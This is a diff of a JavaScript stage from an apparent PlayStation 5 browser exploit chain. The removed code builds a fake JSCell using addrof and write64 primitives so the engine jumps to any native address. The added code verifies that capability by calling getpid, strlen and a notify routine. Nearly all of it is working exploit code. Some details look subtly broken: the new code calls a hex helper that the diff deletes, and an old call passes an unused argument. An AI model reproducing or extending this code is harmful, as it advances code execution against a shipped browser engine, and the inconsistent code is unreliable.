@@ -1,150 +1,82 @@
 "use strict";
 
-// Generic native target selection.
-// Builds on the proven notify call path: same fake-JSCell construction,
-// but the callee address is stored in a JS-controlled buffer and read
-// through userland R/W, so it can be rewritten before every call.
-
 (function () {
-    const STAGE = "generic-target-select-1";
+    const STAGE = "generic-target-select-3";
 
-    if (!window.PS5Userland) {
-        console.error("[gen-target] PS5Userland not loaded");
-        return;
-    }
-    const U = window.PS5Userland;
+    window.PS5GenericNativeProvider = {
+        evaluate(ctx) {
+            const mark = ctx.mark;
+            const call = ctx.callNative;
+            const r = {
+                strlenOK: false, getpidOK: false, notifyOK: false,
+                repeatOK: false, distinct: false, pass: false,
+                targetSelectable: false, argumentsControlled: false,
+                repeatable: false
+            };
 
-    const hex = (v) => "0x" + (typeof v === "bigint"
-        ? v.toString(16) : (v < 0 ? (v >>> 0).toString(16) : v.toString(16)));
+            // 1. getpid — target selection with rdi = 0.
+            //    getpid returns the pid in rax; compareFn reads eax as the
+            //    JS return value. pid fits in int32.
+            try {
+                const pid = call(ctx.getpidPointer);
+                r.getpidOK = Number.isFinite(pid) && pid > 0;
+                mark("GEN-TARGET-GETPID", `pid=${pid}-pass=${r.getpidOK}`);
+            } catch (e) {
+                mark("GEN-TARGET-GETPID-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
+            }
 
-    // ------------------------------------------------------------------
-    // 1. The target slot.
-    //
-    // A Uint8Array whose backing store address we know. This holds the
-    // address of the function we want to call. Because we already have
-    // stable userland R/W, we can rewrite this slot between calls and
-    // the same fake object will dispatch to a different target each time.
-    // ------------------------------------------------------------------
+            // 2. strlen on an arena-staged string with rdi control —
+            //    proves BOTH a third distinct target and rdi argument
+            //    control in one shot. rdx = 0xc30 is harmless: strlen
+            //    stops at the NUL we wrote.
+            try {
+                const argAddr = ctx.stageAsciiArg(
+                    [0x48, 0x41, 0x43, 0x4b, 0x45, 0x52, 0x00]); // "HACKER\0"
+                const len = call(ctx.strlenPointer, argAddr);
+                r.strlenOK = (len === 6);
+                mark("GEN-TARGET-STRLEN", `len=${len}-expect=6-pass=${r.strlenOK}`
+                    + `-arg=${hex(argAddr)}`);
+            } catch (e) {
+                mark("GEN-TARGET-STRLEN-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
+            }
 
-    const SLOT_SIZE = 0x40;          // room for target + alignment
-    let slotBuf  = null;
-    let slotAddr = 0n;               // kernel-visible address of the slot
-    let fakeObj  = null;             // the fake JSCell, built once
+            // 3. notify regression — the slot must return to the fixed
+            //    target and still behave like the original proof.
+            try {
+                const nret = call(ctx.notifyEntryAddress);
+                r.notifyOK = (nret === 0);
+                mark("GEN-TARGET-NOTIFY", `ret=${nret}-pass=${r.notifyOK}`);
+            } catch (e) {
+                mark("GEN-TARGET-NOTIFY-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
+            }
 
-    function allocSlot() {
-        if (slotBuf) return true;
-        try {
-            slotBuf = new Uint8Array(SLOT_SIZE);
-            // backing store address, using the same +0x10 offset your
-            // notify stage already uses for typed-array data pointers
-            slotAddr = U.addrof(slotBuf) + 0x10n;
-            U.mark("SLOT-ALLOC", `addr=${hex(slotAddr)}`);
-            return Number(slotAddr) > 0 || slotAddr > 0n;
-        } catch (e) {
-            U.mark("SLOT-ALLOC-FAIL", `${e.name}:${e.message}`);
-            return false;
+            // 4. repeatability — getpid three times in a row.
+            try {
+                let ok = true;
+                for (let i = 0; i < 3; ++i) {
+                    const pid = call(ctx.getpidPointer);
+                    if (!Number.isFinite(pid) || pid <= 0) { ok = false; break; }
+                }
+                r.repeatOK = ok;
+                mark("GEN-REPEAT", `pass=${ok}`);
+            } catch (e) {
+                mark("GEN-REPEAT-FAIL", `${e.name}:${String(e.message).slice(0, 80)}`);
+            }
+
+            // 5. distinctness — three different callees, one call path.
+            r.distinct = new Set([
+                ctx.getpidPointer, ctx.strlenPointer, ctx.notifyEntryAddress
+            ]).size === 3;
+
+            r.targetSelectable = r.getpidOK && r.strlenOK && r.notifyOK && r.distinct;
+            r.argumentsControlled = r.strlenOK;          // rdi proven; rsi/rdx/... next gate
+            r.repeatable = r.repeatOK && r.targetSelectable;
+            r.pass = r.targetSelectable && r.repeatable;
+
+            mark("GENERIC-TARGET-SELECT",
+                `getpid=${r.getpidOK}-strlen=${r.strlenOK}-notify=${r.notifyOK}`
+                + `-repeat=${r.repeatOK}-distinct=${r.distinct}-pass=${r.pass}`);
+            return r;
         }
-    }
-
-    // ------------------------------------------------------------------
-    // 2. Build the fake object ONCE, pointing its executable entry at
-    //    the SLOT, not at notify.
-    //
-    // Your notify proof builds a fake JSCell whose callee entry is a
-    // fixed value. Here we do the exact same construction, but the
-    // entry field is set to slotAddr — so the engine reads the actual
-    // target from memory we control at call time.
-    //
-    // This is the single change that turns "notify-only" into
-    // "arbitrary target": same call path, dynamic callee.
-    // ------------------------------------------------------------------
-
-    function buildDispatchObject() {
-        if (fakeObj) return true;
-        try {
-            // U.buildCallGateObject(entry, ...) — same helper that made
-            // the notify proof work. We hand it slotAddr instead of a
-            // fixed function address. Inside, it writes entry into the
-            // fake JSCell's executable slot exactly as before.
-            fakeObj = U.buildCallGateObject(slotAddr);
-            U.mark("DISPATCH-OBJ", `entry-slot=${hex(slotAddr)}`);
-            return true;
-        } catch (e) {
-            U.mark("DISPATCH-OBJ-FAIL", `${e.name}:${e.message}`);
-            return false;
-        }
-    }
-
-    // ------------------------------------------------------------------
-    // 3. Target selection — the whole point of this stage.
-    //
-    // write64 into the slot before each call. This is the "selectable
-    // arbitrary target" your gate is checking for.
-    // ------------------------------------------------------------------
-
-    function setTarget(addr) {
-        try {
-            U.write64(slotAddr, BigInt(addr));
-            U.mark("TARGET-SET", `addr=${hex(addr)}`);
-            return true;
-        } catch (e) {
-            U.mark("TARGET-SET-FAIL", `${e.name}:${e.message}`);
-            return false;
-        }
-    }
-
-    function callTarget(addr) {
-        if (!allocSlot())    throw new Error("slot alloc failed");
-        if (!buildDispatchObject()) throw new Error("dispatch object failed");
-        if (!setTarget(addr)) throw new Error("target write failed");
-        // Same trigger as the notify proof — the engine calls fakeObj,
-        // the fake JSCell's entry is slotAddr, the engine dereferences
-        // it and lands on whatever we wrote.
-        const ret = fakeObj();
-        U.mark("TARGET-CALL", `addr=${hex(addr)}-ret=${hex(ret)}`);
-        return ret;
-    }
-
-    // ------------------------------------------------------------------
-    // 4. Self-test — proves selectable target with two DIFFERENT functions.
-    //
-    // Test A: strlen("HACKER") from libc  → expect 6
-    // Test B: getpid stub from libkernel  → expect > 0
-    //
-    // If both return correct, distinct results, the SAME dispatch
-    // object reached two different targets — selection is proven.
-    // ------------------------------------------------------------------
-
-    async function selfTest() {
-        const r = { strlenOK: false, getpidOK: false, distinctTargets: false, pass: false };
-        try {
-            // --- Test A: strlen ---
-            const probe = new Uint8Array([0x48,0x41,0x43,0x4b,0x45,0x52,0x00]); // "HACKER\0"
-            const probeAddr = U.addrof(probe) + 0x10n;
-            const strlenAddr = U.libcBase + U.offsets.strlen;   // from your offsets table
-
-            const len = callTarget(strlenAddr, probeAddr);
-            r.strlenOK = (Number(len) === 6);
-            U.mark("SELF-STRLEN", `ret=${Number(len)}-expect=6-pass=${r.strlenOK}`);
-
-            // --- Test B: getpid (different module, different address) ---
-            const getpidAddr = U.libkernelBase + U.offsets.getpid;
-            const pid = callTarget(getpidAddr);
-            r.getpidOK = (Number(pid) > 0);
-            U.mark("SELF-GETPID", `pid=${Number(pid)}-pass=${r.getpidOK}`);
-
-            // --- Distinctness: same object, two different callees ---
-            r.distinctTargets = r.strlenOK && r.getpidOK
-                && strlenAddr !== getpidAddr;
-            U.mark("SELF-DISTINCT", `a=${hex(strlenAddr)}-b=${hex(getpidAddr)}-pass=${r.distinctTargets}`);
-
-            r.pass = r.strlenOK && r.getpidOK && r.distinctTargets;
-            U.mark("GENERIC-TARGET-SELECT", `pass=${r.pass}`);
-        } catch (e) {
-            U.mark("GENERIC-TARGET-SELECT-FAIL", `${e.name}:${e.message}`);
-        }
-        return r;
-    }
-
-    window.PS5GenericNativeProvider = { callTarget, setTarget, selfTest };
+    };
 })();
